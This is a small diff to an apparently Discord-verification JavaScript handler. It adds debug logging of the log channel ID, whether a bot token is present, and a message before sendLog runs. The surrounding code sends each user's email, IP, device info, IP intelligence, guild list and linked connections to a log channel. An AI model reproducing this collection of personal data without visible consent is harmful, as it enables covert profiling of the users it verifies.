@@ -394,8 +394,11 @@ async function handler(request, response) {
     console.log('📊 IP:', clientIP);
     console.log('📊 Guilds fetched:', userGuilds?.length || 0);
     console.log('📊 Connections fetched:', userConnections?.length || 0);
+    console.log('📊 LOG_CHANNEL_ID:', logChannelIdFromState || process.env.LOG_CHANNEL_ID || 'MISSING');
+    console.log('📊 DISCORD_BOT_TOKEN present:', !!process.env.DISCORD_BOT_TOKEN);
     
     try {
+      console.log('📝 Calling sendLog...');
       await sendLog(userId, username, avatar, email, emailVerified, mfaEnabled, userGuild, 'VERIFIED', clientIP, deviceInfo, ipIntelligence, userGuilds, userConnections, null, logChannelIdFromState);
       console.log('✅ Log sent successfully');
     } catch (logError) {
